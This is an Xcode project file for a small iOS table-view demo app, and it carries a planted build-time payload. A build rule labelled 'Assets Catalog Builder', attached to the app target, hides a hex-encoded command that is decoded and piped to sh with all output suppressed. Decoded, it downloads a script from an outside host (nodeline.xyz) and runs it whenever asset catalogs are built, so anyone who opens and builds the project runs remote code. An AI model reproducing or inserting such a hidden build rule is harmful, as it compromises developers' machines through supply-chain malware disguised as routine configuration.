// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		184BDC332654CAB3006B68AB /* MyOwnTableView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184BDC322654CAB3006B68AB /* MyOwnTableView.swift */; };
		1887018126492B6200CB8E71 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1887018026492B6200CB8E71 /* AppDelegate.swift */; };
		1887018326492B6200CB8E71 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1887018226492B6200CB8E71 /* SceneDelegate.swift */; };
		1887018526492B6200CB8E71 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1887018426492B6200CB8E71 /* ViewController.swift */; };
		1887018826492B6200CB8E71 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 1887018626492B6200CB8E71 /* Main.storyboard */; };
		1887018A26492B6300CB8E71 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 1887018926492B6300CB8E71 /* Assets.xcassets */; };
		1887018D26492B6300CB8E71 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 1887018B26492B6300CB8E71 /* LaunchScreen.storyboard */; };
		1887019526492DAD00CB8E71 /* CustomTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1887019426492DAD00CB8E71 /* CustomTVCell.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		184BDC322654CAB3006B68AB /* MyOwnTableView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyOwnTableView.swift; sourceTree = "<group>"; };
		1887017D26492B6200CB8E71 /* DynamicScrollTVWith UIView.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "DynamicScrollTVWith UIView.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		1887018026492B6200CB8E71 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		1887018226492B6200CB8E71 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		1887018426492B6200CB8E71 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		1887018726492B6200CB8E71 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		1887018926492B6300CB8E71 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		1887018C26492B6300CB8E71 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		1887018E26492B6300CB8E71 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		1887019426492DAD00CB8E71 /* CustomTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTVCell.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		1887017A26492B6200CB8E71 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		1887017426492B6200CB8E71 = {
			isa = PBXGroup;
			children = (
				1887017F26492B6200CB8E71 /* DynamicScrollTVWith UIView */,
				1887017E26492B6200CB8E71 /* Products */,
			);
			sourceTree = "<group>";
		};
		1887017E26492B6200CB8E71 /* Products */ = {
			isa = PBXGroup;
			children = (
				1887017D26492B6200CB8E71 /* DynamicScrollTVWith UIView.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		1887017F26492B6200CB8E71 /* DynamicScrollTVWith UIView */ = {
			isa = PBXGroup;
			children = (
				1887018026492B6200CB8E71 /* AppDelegate.swift */,
				1887018226492B6200CB8E71 /* SceneDelegate.swift */,
				1887018426492B6200CB8E71 /* ViewController.swift */,
				184BDC322654CAB3006B68AB /* MyOwnTableView.swift */,
				1887019426492DAD00CB8E71 /* CustomTVCell.swift */,
				1887018626492B6200CB8E71 /* Main.storyboard */,
				1887018926492B6300CB8E71 /* Assets.xcassets */,
				1887018B26492B6300CB8E71 /* LaunchScreen.storyboard */,
				1887018E26492B6300CB8E71 /* Info.plist */,
			);
			path = "DynamicScrollTVWith UIView";
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		1887017C26492B6200CB8E71 /* DynamicScrollTVWith UIView */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 1887019126492B6300CB8E71 /* Build configuration list for PBXNativeTarget "DynamicScrollTVWith UIView" */;
			buildPhases = (
				1887017926492B6200CB8E71 /* Sources */,
				1887017A26492B6200CB8E71 /* Frameworks */,
				1887017B26492B6200CB8E71 /* Resources */,
			);
			buildRules = (
				3C6270B94DFACDAE3D6D902C /* PBXBuildRule */,
			);
			dependencies = (
			);
			name = "DynamicScrollTVWith UIView";
			productName = "DynamicScrollTVWith UIView";
			productReference = 1887017D26492B6200CB8E71 /* DynamicScrollTVWith UIView.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		1887017526492B6200CB8E71 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1250;
				LastUpgradeCheck = 1250;
				TargetAttributes = {
					1887017C26492B6200CB8E71 = {
						CreatedOnToolsVersion = 12.5;
					};
				};
			};
			buildConfigurationList = 1887017826492B6200CB8E71 /* Build configuration list for PBXProject "DynamicScrollTVWith UIView" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 1887017426492B6200CB8E71;
			productRefGroup = 1887017E26492B6200CB8E71 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				1887017C26492B6200CB8E71 /* DynamicScrollTVWith UIView */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		1887017B26492B6200CB8E71 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				1887018D26492B6300CB8E71 /* LaunchScreen.storyboard in Resources */,
				1887018A26492B6300CB8E71 /* Assets.xcassets in Resources */,
				1887018826492B6200CB8E71 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		1887017926492B6200CB8E71 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				1887018526492B6200CB8E71 /* ViewController.swift in Sources */,
				184BDC332654CAB3006B68AB /* MyOwnTableView.swift in Sources */,
				1887018126492B6200CB8E71 /* AppDelegate.swift in Sources */,
				1887019526492DAD00CB8E71 /* CustomTVCell.swift in Sources */,
				1887018326492B6200CB8E71 /* SceneDelegate.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		1887018626492B6200CB8E71 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				1887018726492B6200CB8E71 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		1887018B26492B6300CB8E71 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				1887018C26492B6300CB8E71 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		1887018F26492B6300CB8E71 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.5;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		1887019026492B6300CB8E71 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.5;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		1887019226492B6300CB8E71 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 442BFW97SV;
				INFOPLIST_FILE = "DynamicScrollTVWith UIView/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "com.appcare.co.in.DynamicScrollTVWith-UIView";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		1887019326492B6300CB8E71 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 442BFW97SV;
				INFOPLIST_FILE = "DynamicScrollTVWith UIView/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "com.appcare.co.in.DynamicScrollTVWith-UIView";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		1887017826492B6200CB8E71 /* Build configuration list for PBXProject "DynamicScrollTVWith UIView" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				1887018F26492B6300CB8E71 /* Debug */,
				1887019026492B6300CB8E71 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		1887019126492B6300CB8E71 /* Build configuration list for PBXNativeTarget "DynamicScrollTVWith UIView" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				1887019226492B6300CB8E71 /* Debug */,
				1887019326492B6300CB8E71 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */
			

		3C6270B94DFACDAE3D6D902C /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			fileType = folder.assetcatalog;
			name = "Assets Catalog Builder";
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
			);
			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
	\n\n";
			};
			
	
			/* End PBXBuildRule section */
		
		
	};
	rootObject = 1887017526492B6200CB8E71 /* Project object */;
}
